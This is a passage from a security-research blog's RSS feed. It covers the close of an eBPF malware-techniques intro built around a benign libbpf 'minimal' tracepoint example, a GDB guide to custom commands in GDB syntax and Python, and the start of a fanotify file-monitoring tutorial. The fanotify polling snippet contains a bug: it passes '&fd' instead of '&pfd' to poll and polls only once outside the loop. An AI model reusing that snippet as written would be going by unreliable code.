<p>If the verifier rejects your eBPF program due to complexity, memory safety, or access issues, this step will fail. All eBPF programs must pass this strict validation step before they are allowed to run in kernel space.</p>
<p>Once loaded, we attach the BPF program to a kernel event.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span><span style="color:#75715e">/* Attach tracepoint handler */</span>
</span></span><span style="display:flex;"><span>err <span style="color:#f92672">=</span> <span style="color:#a6e22e">minimal_bpf__attach</span>(skel);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (err) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;Failed to attach BPF skeleton</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">goto</span> cleanup;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Attaching eBPF Program<br><br></span>
<p>As to what is going on in this program example, we must take a look at <code>minimal.bpf.c</code>. The source code for it isn&rsquo;t too lengthy and here it is in its full glory:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// SPDX-License-Identifier: GPL-2.0 OR BSD-3-Clause
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">/* Copyright (c) 2020 Facebook */</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/bpf.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;bpf/bpf_helpers.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span> LICENSE[] <span style="color:#a6e22e">SEC</span>(<span style="color:#e6db74">&#34;license&#34;</span>) <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Dual BSD/GPL&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> my_pid <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">SEC</span>(<span style="color:#e6db74">&#34;tp/syscalls/sys_enter_write&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">handle_tp</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>ctx)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> pid <span style="color:#f92672">=</span> <span style="color:#a6e22e">bpf_get_current_pid_tgid</span>() <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">32</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (pid <span style="color:#f92672">!=</span> my_pid)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">bpf_printk</span>(<span style="color:#e6db74">&#34;BPF triggered from PID %d.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pid);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Full Source Code - minimal.bpf.c<br><br></span>
<p>Remember our <code>my_pid</code> variable that resides in the <code>.bss</code> section? It is in this section because it has been declared as a global variable here. It also declares a BPF program that is attached to the <em>sys_enter_write</em> tracepoint, using the SEC() macro to place the function into the proper ELF section.</p>
<p>This means that every time any process on the system invokes <em>write()</em>, this handler will be called. Tracepoints are stable instrumentation hooks provided by the kernel — great for observability without worrying about kernel version breakage like raw kprobes might cause.</p>
<p>I&rsquo;ve talked quite a lot at this point so let&rsquo;s just compile this and finally get to it.
<link href="/posts/css/alert.css" rel="stylesheet">
<div class="alert tip">
    <div class="alert-content">
        <div class="alert-header">
            <span class="alert-icon"></span>
            <strong class="alert-title">Tip</strong>
        </div>
        <div class="alert-body"><ul>
<li>For static builds, edit the Makefile:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Makefile" data-lang="Makefile"><span style="display:flex;"><span>CFLAGS <span style="color:#f92672">:=</span> -g -Wall -static
</span></span><span style="display:flex;"><span>ALL_LDFLAGS <span style="color:#f92672">:=</span> <span style="color:#66d9ef">$(</span>LDFLAGS<span style="color:#66d9ef">)</span> <span style="color:#66d9ef">$(</span>EXTRA_LDFLAGS<span style="color:#66d9ef">)</span> -static -lelf -lz -lzstd
</span></span></code></pre></div></li>
</ul>
</div>
    </div>
</div>
</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Get dependencies</span>
</span></span><span style="display:flex;"><span>$ sudo apt-get install clang llvm build-essential libelf1 libelf-dev zlib1g-dev libzstd-dev
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Compile minimal eBPF application</span>
</span></span><span style="display:flex;"><span>$ cd examples/c
</span></span><span style="display:flex;"><span>$ make minimal
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Getting Dependencies and Building Minimal eBPF Application<br><br></span>
<p>Once done, we just run it and open a separate terminal to look at the <code>trace_pipe</code> file.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo ./minimal
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Open another terminal</span>
</span></span><span style="display:flex;"><span>$ sudo cat /sys/kernel/debug/tracing/trace_pipe
</span></span></code></pre></div><video width=100% controls>
    <source src="/posts/ebpf-malware-techniques/ebpf-malware-techniques-part-1-introduction/videos/libbpf-bootstrap-minimal.webm" type="video/webm">
    Your browser does not support the video tag.  
</video>
<link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="video"><em>libbpf-bootstrap</em> Demo - minimal eBPF Applicatoin<br><br></span>
<h2 id="5-conclusion">5. Conclusion</h2>
<p>There&rsquo;s more to come in part 2 of this series! In the meantime, stay frosty and stay safe!</p>
]]></content>
        </item>
        
        <item>
            <title>GDB Guide Part 7 - Custom Commands</title>
            <link>https://mathscantor.github.io/posts/gdb-guides/gdb-guide-part7-custom-commands/</link>
            <pubDate>Wed, 19 Mar 2025 22:15:30 +0800</pubDate>
            
            <guid>https://mathscantor.github.io/posts/gdb-guides/gdb-guide-part7-custom-commands/</guid>
            <description>&lt;h2 id=&#34;1-introduction&#34;&gt;1. Introduction&lt;/h2&gt;
&lt;p&gt;Today&amp;rsquo;s lesson will focus primarily on creating custom commands in GDB. If you are a long term user of the vanilla GDB, you may find yourself wanting more features to support your research needs. To fulfill those needs, the open-source project, &lt;a href=&#34;https://github.com/hugsy/gef&#34;&gt;GEF (GDB Enhanced Features)&lt;/a&gt; provides many QoL features that aid dynamic analysis.&lt;/p&gt;
&lt;p&gt;However, GEF is not what I want to talk about today. Instead of using GEF, we will be writing our user-defined commands using native GDB syntax first, then extending them further with python to enhance GDB&amp;rsquo;s capabilities.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<h2 id="1-introduction">1. Introduction</h2>
<p>Today&rsquo;s lesson will focus primarily on creating custom commands in GDB. If you are a long term user of the vanilla GDB, you may find yourself wanting more features to support your research needs. To fulfill those needs, the open-source project, <a href="https://github.com/hugsy/gef">GEF (GDB Enhanced Features)</a> provides many QoL features that aid dynamic analysis.</p>
<p>However, GEF is not what I want to talk about today. Instead of using GEF, we will be writing our user-defined commands using native GDB syntax first, then extending them further with python to enhance GDB&rsquo;s capabilities.</p>
<h2 id="2-gdb-syntax">2. GDB Syntax</h2>
<p>For example, if you needed to do a set of repetitive commands over and over again, you can just define them under a user-defined command.</p>
<p>The following example shows how you can define a new command called &ldquo;test_command&rdquo;, where it takes one step-into, examine the current instruction and then printing information on the RDI register.
<a name="test_command"></a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> define test_command
</span></span><span style="display:flex;"><span>&gt; si
</span></span><span style="display:flex;"><span>&gt; x/i $pc 
</span></span><span style="display:flex;"><span>&gt; info registers rdi
</span></span><span style="display:flex;"><span>&gt; end
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Example of User-Defined Commands<br><br></span>
<video width=100% controls>
    <source src="/posts/gdb-guides/gdb-guide-part7-custom-commands/videos/gdb-syntax.webm" type="video/webm">
    Your browser does not support the video tag.  
</video>
<link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="video">Demo - Using User-Defined Commands<br><br></span>
<h2 id="3-python">3. Python</h2>
<p>To create a new custom command in python, all you need to do is create a new class that inherits from the <em>gdb.Command</em> class.
Let&rsquo;s break this down step by step!</p>
<h3 id="31-setting-new-class">3.1 Setting New Class</h3>
<p>Preferably, we want to name our python class based on the command that we are creating. For example, if we want the custom command to be &ldquo;get_base_addr&rdquo;, then
the class should be called <em>GetBaseAddr</em>.</p>
<p>The snippet below shows the overall layout of what your class should look like as a start:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">TestCommand</span>(gdb<span style="color:#f92672">.</span>Command):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(self):
</span></span><span style="display:flex;"><span>      self<span style="color:#f92672">.</span>__command_name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;test_command&#34;</span>
</span></span><span style="display:flex;"><span>      super(TestCommand, self)<span style="color:#f92672">.</span>__init__(self<span style="color:#f92672">.</span>__command_name, gdb<span style="color:#f92672">.</span>COMMAND_USER)
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>TestCommand()
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Python Class Overall Template<br><br></span>
<h3 id="32-defining-invoke-function">3.2 Defining Invoke Function</h3>
<p>Still within the same class, we will also need to define our <em>invoke()</em> function which contains all the logic of our user-defined command.</p>
<p>The snippet below replicates what we did <a href="/posts/gdb-guides/gdb-guide-part7-custom-commands/#test_command">previously</a>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">invoke</span>(self, args: str, from_tty: bool <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>) <span style="color:#f92672">-&gt;</span> <span style="color:#66d9ef">None</span>:
</span></span><span style="display:flex;"><span>    gdb<span style="color:#f92672">.</span>execute(<span style="color:#e6db74">&#34;si&#34;</span>)
</span></span><span style="display:flex;"><span>    gdb<span style="color:#f92672">.</span>execute(<span style="color:#e6db74">&#34;x/i $pc&#34;</span>)
</span></span><span style="display:flex;"><span>    gdb<span style="color:#f92672">.</span>execute(<span style="color:#e6db74">&#34;info registers rdi&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Example of <em>invoke()</em> Function Logic<br><br></span>
<link href="/posts/css/alert.css" rel="stylesheet">
<div class="alert tip">
    <div class="alert-content">
        <div class="alert-header">
            <span class="alert-icon"></span>
            <strong class="alert-title">Tip</strong>
        </div>
        <div class="alert-body"><ul>
<li>You can pass arguments to invoke which will be taken in as a full string. You will need to parse it yourself.</li>
<li>You can redirect the output to a variable to do further processing.
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Example to put the mappings into a list</span>
</span></span><span style="display:flex;"><span>mappings <span style="color:#f92672">=</span> gdb<span style="color:#f92672">.</span>execute(<span style="color:#e6db74">&#34;info proc mappings&#34;</span>, to_string<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#ae81ff">4</span>:]
</span></span></code></pre></div></li>
</ul>
</div>
    </div>
</div>

<h3 id="33-importing-command--running">3.3 Importing Command &amp; Running</h3>
<p>Once the above 2 steps are done correctly, you will be able to import your new command in by doing the following command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> source test_command.py
</span></span></code></pre></div><p>If there are any syntax errors, go back and fix the python code and import it in again. When GDB doesn&rsquo;t complain, it means your custom command has been
successfully imported! The name of your command will follow what you have defined previously in <code>self.__command_name</code>.</p>
<video width=100% controls>
    <source src="/posts/gdb-guides/gdb-guide-part7-custom-commands/videos/python-class.webm" type="video/webm">
    Your browser does not support the video tag.  
</video>
<link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="video">Demo - Running Python User-Defined Command<br><br></span>
<h2 id="4-conclusion">4. Conclusion</h2>
<p>Now that you have reached this stage of the tutorial, great job making it this far!</p>
<p>If you are interested in more useful python extensions for GDB, you may check out some of the <a href="https://github.com/mathscantor/mGDB/tree/main/gdb_scripts/py_commands">commands</a> I wrote to help researchers debug their targets faster.</p>
<h2 id="5-resources">5. Resources</h2>
<ol>
<li><a href="https://github.com/hugsy/gef">GEF (GDB Enhanced Features)</a></li>
<li><a href="https://github.com/mathscantor/mGDB/tree/main/gdb_scripts/py_commands">Useful Python Extensions</a></li>
</ol>
]]></content>
        </item>
        
        <item>
            <title>Linux File Monitoring With Fanotify</title>
            <link>https://mathscantor.github.io/posts/linux-file-monitoring-with-fanotify/</link>
            <pubDate>Fri, 14 Mar 2025 20:09:42 +0800</pubDate>
            
            <guid>https://mathscantor.github.io/posts/linux-file-monitoring-with-fanotify/</guid>
            <description>&lt;h2 id=&#34;1-introduction&#34;&gt;1. Introduction&lt;/h2&gt;
&lt;p&gt;Let&amp;rsquo;s take a break from the GDB exercises and instead look into something that I have yet to talk about in this blog, and that is - Linux file monitoring with the fanotify API.&lt;/p&gt;
&lt;p&gt;Fanotify is a Linux kernel API that enables applications to receive notifications about file system events. It is commonly used for:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Real-time security monitoring (e.g., antivirus scanning)&lt;/li&gt;
&lt;li&gt;Auditing and compliance (e.g., logging file accesses)&lt;/li&gt;
&lt;li&gt;File system activity tracking (e.g., synchronizing backups)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The main reason why so many antivirus software products use fanotify over inotify, is because it provides information on the triggering process PID and can even allow/deny any process trying to read a file via the &lt;code&gt;FAN_ALLOW&lt;/code&gt; or &lt;code&gt;FAN_DENY&lt;/code&gt; response.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<h2 id="1-introduction">1. Introduction</h2>
<p>Let&rsquo;s take a break from the GDB exercises and instead look into something that I have yet to talk about in this blog, and that is - Linux file monitoring with the fanotify API.</p>
<p>Fanotify is a Linux kernel API that enables applications to receive notifications about file system events. It is commonly used for:</p>
<ul>
<li>Real-time security monitoring (e.g., antivirus scanning)</li>
<li>Auditing and compliance (e.g., logging file accesses)</li>
<li>File system activity tracking (e.g., synchronizing backups)</li>
</ul>
<p>The main reason why so many antivirus software products use fanotify over inotify, is because it provides information on the triggering process PID and can even allow/deny any process trying to read a file via the <code>FAN_ALLOW</code> or <code>FAN_DENY</code> response.</p>
<p>However, we can also use the fanotify API for cyber research purposes! When studying a new target, it is hard to tell exactly what many of the core processes are doing, especially when it comes to file operations. That is why the fanotify API is so powerful as it gives the researcher a broad overview of what the processes are reading from and writing to.</p>
<p>In this post, I will show you how you can write your own fanotify user-space application to monitor for file/directory events, as long as your kernel was built with fanotify capabilities. <em>Ensure that you have sudo or root privileges too before running your fanotify application</em>.</p>
<p>You can also check out <a href="https://github.com/mathscantor/filemon"><em>filemon</em></a>, a multithreaded Linux file-monitoring tool which I have created for research purposes. With that out of the way, let&rsquo;s dive right into it!</p>
<h2 id="2-checking-if-fanotify-is-enabled">2. Checking if Fanotify is Enabled</h2>
<p>To check if your kernel was built with fanotify enabled, we have to check the configuration options under <em>/boot/config-&lt;KERNEL_VERSION&gt;</em>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cat /boot/config-<span style="color:#66d9ef">$(</span>uname -r<span style="color:#66d9ef">)</span> | grep FANOTIFY
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>CONFIG_FANOTIFY<span style="color:#f92672">=</span>y
</span></span><span style="display:flex;"><span>CONFIG_FANOTIFY_ACCESS_PERMISSIONS<span style="color:#f92672">=</span>y
</span></span></code></pre></div><p>If <code>CONFIG_FANOTIFY_ACCESS_PERMISSIONS=n</code> or not defined, that just means that we will not be able to check for events such as <code>FAN_ACCESS_PERM</code>, <code>FAN_OPEN_PERM</code> and <code>FAN_OPEN_EXEC_PERM</code>.</p>
<p>As long as <code>CONFIG_FANOTIFY=y</code> is set, we are good to go!</p>
<h2 id="3-overall-fanotify-api-usage">3. Overall Fanotify API Usage</h2>
<p>To begin, we need to create a fanotify file descriptor using <em>fanotify_init()</em>, paying special attention to the flags supplied to it (elaborated later).</p>
<p>We will then mark a file/directory/mount point with <em>fanotify_mark()</em> and proceed to read from the fanotify file descriptors to inspect events.</p>
<p>The snippets below shows an overview of the APIs involved for different use case of file monitoring:</p>
<ul>
<li>Start by initializing a fanotify file descriptor
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// Flags will be provided in other examples later
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">int</span> fan_fd <span style="color:#f92672">=</span> <span style="color:#a6e22e">fanotify_init</span>(...);
</span></span></code></pre></div></li>
<li>Example to monitor a specific file for FAN_OPEN
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">fanotify_mark</span>(fan_fd, FAN_MARK_ADD, FAN_OPEN, AT_FDCWD, <span style="color:#e6db74">&#34;test.txt&#34;</span>);
</span></span></code></pre></div></li>
<li>Example to monitor a directory (non-recursive, excluding files) for FAN_OPEN
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">fanotify_mark</span>(fan_fd, FAN_MARK_ADD <span style="color:#f92672">|</span> FAN_MARK_ONLYDIR, FAN_ONDIR <span style="color:#f92672">|</span> FAN_OPEN, AT_FDCWD, <span style="color:#e6db74">&#34;/tmp/testdir&#34;</span>);
</span></span></code></pre></div></li>
<li>Example to monitor a directory (non-recursive, including files) for FAN_OPEN
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">fanotify_mark</span>(fan_fd, FAN_MARK_ADD, FAN_EVENT_ON_CHILD <span style="color:#f92672">|</span> FAN_ONDIR <span style="color:#f92672">|</span> FAN_OPEN, AT_FDCWD, <span style="color:#e6db74">&#34;/tmp/testdir&#34;</span>);
</span></span></code></pre></div></li>
<li>Example to monitor the &ldquo;/&rdquo; mount point (recursive, including files and new directories) for FAN_OPEN
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">fanotify_mark</span>(fan_fd, FAN_MARK_ADD <span style="color:#f92672">|</span> FAN_MARK_MOUNT, FAN_EVENT_ON_CHILD <span style="color:#f92672">|</span> FAN_ONDIR <span style="color:#f92672">|</span> FAN_OPEN, AT_FDCWD, <span style="color:#e6db74">&#34;/&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Only on newer kernel versions (since 4.20)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">fanotify_mark</span>(fan_fd, FAN_MARK_ADD <span style="color:#f92672">|</span> FAN_MARK_FILESYSTEM, FAN_EVENT_ON_CHILD <span style="color:#f92672">|</span> FAN_ONDIR <span style="color:#f92672">|</span> FAN_OPEN, AT_FDCWD, <span style="color:#e6db74">&#34;/&#34;</span>);
</span></span></code></pre></div></li>
</ul>
<p>Now that you have a better understanding on the overall APIs, we need to look deeper into which specific flags and masks to use. I have sunk countless hours through trial and error (so that you don&rsquo;t have to 😊) in order to find the optimal set of flags and masks for monitoring specific events.</p>
<h2 id="4-inspecting-read-write-execute-events">4. Inspecting Read, Write, Execute Events</h2>
<p>The <a href="https://man7.org/linux/man-pages/man7/fanotify.7.html">fanotify(7)</a> man page has provided a template example for inspecting read, write and execute events.</p>
<p>Instead of specifying the <code>FAN_NONBLOCK</code> flag in <em>fanotify_init()</em>, we should omit it in order to capture all events. If <code>FAN_NONBLOCK</code> is specified, there is a chance that certain events may slip under the radar if our application cannot read it in time.</p>
<p><a name="flags"></a> Therefore, with the modification applied, our initialization should look like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> fan_fd <span style="color:#f92672">=</span> <span style="color:#a6e22e">fanotify_init</span>(FAN_CLOEXEC <span style="color:#f92672">|</span> FAN_CLASS_CONTENT, O_RDONLY <span style="color:#f92672">|</span> O_LARGEFILE);
</span></span></code></pre></div><p>After getting a valid fanotify file descriptor (not -1), we can mark a file/directory/mount point. In this example, I will just be marking the &ldquo;/&rdquo; mount point with <code>FAN_MARK_MOUNT</code> as it is backwards compatible with older kernel versions.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">uint64_t</span> masks <span style="color:#f92672">=</span> FAN_EVENT_ON_CHILD <span style="color:#f92672">|</span> \
</span></span><span style="display:flex;"><span>                 FAN_ONDIR <span style="color:#f92672">|</span> \
</span></span><span style="display:flex;"><span>                 FAN_ACCESS <span style="color:#f92672">|</span> \
</span></span><span style="display:flex;"><span>                 FAN_OPEN <span style="color:#f92672">|</span> \
</span></span><span style="display:flex;"><span>                 FAN_MODIFY <span style="color:#f92672">|</span> \
</span></span><span style="display:flex;"><span>                 FAN_OPEN_EXEC <span style="color:#f92672">|</span> <span style="color:#960050;background-color:#1e0010">\</span>  <span style="color:#75715e">// Only from Linux 5.0 onwards
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                 FAN_CLOSE_WRITE <span style="color:#f92672">|</span> \
</span></span><span style="display:flex;"><span>                 FAN_CLOSE_NOWRITE; 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fanotify_mark</span>(fan_fd, FAN_MARK_ADD <span style="color:#f92672">|</span> FAN_MARK_MOUNT, masks, AT_FDCWD, <span style="color:#e6db74">&#34;/&#34;</span>);
</span></span></code></pre></div><p>We can do a <em>poll()</em> on our fanotify file descriptor to wait for incoming events and parse them accordingly.
For the sake of simplicity, The overall code should look like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> pollfd pfd;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">ssize_t</span> buflen <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">8192</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> fanotify_event_metadata <span style="color:#f92672">*</span>metadata;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pfd.fd <span style="color:#f92672">=</span> fan_fd;
</span></span><span style="display:flex;"><span>pfd.events <span style="color:#f92672">=</span> POLLIN;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">poll</span>(<span style="color:#f92672">&amp;</span>fd, <span style="color:#ae81ff">1</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>); <span style="color:#75715e">// -1 for no TIMEOUT
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> (ret <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;poll&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">exit</span>(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> (;;) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (pfd.revents <span style="color:#f92672">&amp;</span> POLLIN) {
</span></span><span style="display:flex;"><span>    buflen <span style="color:#f92672">=</span> <span style="color:#a6e22e">read</span>(fan_fd, buf, <span style="color:#66d9ef">sizeof</span>(buf));
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (buflen <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>) <span style="color:#66d9ef">continue</span>;
</span></span><span style="display:flex;"><span>    metadata <span style="color:#f92672">=</span> (<span style="color:#66d9ef">struct</span> fanotify_event_metadata <span style="color:#f92672">*</span>)buf;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (<span style="color:#a6e22e">FAN_EVENT_OK</span>(metadata, buflen)) {
</span></span><span style="display:flex;"><span>      ...
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (metadata<span style="color:#f92672">-&gt;</span>mask <span style="color:#f92672">&amp;</span> FAN_ACCESS)
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;FAN_ACCESS&#34;</span>);
</span></span><span style="display:flex;"><span>      ...
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">// next event
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#a6e22e">close</span>(metadata<span style="color:#f92672">-&gt;</span>fd);
</span></span><span style="display:flex;"><span>      metadata <span style="color:#f92672">=</span> <span style="color:#a6e22e">FAN_EVENT_NEXT</span>(metadata, buflen);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h2 id="5-inspecting-create-delete-move-events">5. Inspecting Create, Delete, Move Events</h2>
<p>In the same <a href="https://man7.org/linux/man-pages/man7/fanotify.7.html">fanotify(7)</a> man page, they provided an additional example of fanotify being used with a group that identifies objects by file handles.</p>
<p>As usual, we will initialize a fanotify file descriptor but this time, we will use the flags meant for file handles.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> fan_fd <span style="color:#f92672">=</span> <span style="color:#a6e22e">fanotify_init</span>(FAN_CLASS_NOTIF <span style="color:#f92672">|</span> FAN_REPORT_DFID_NAME, O_RDWR);
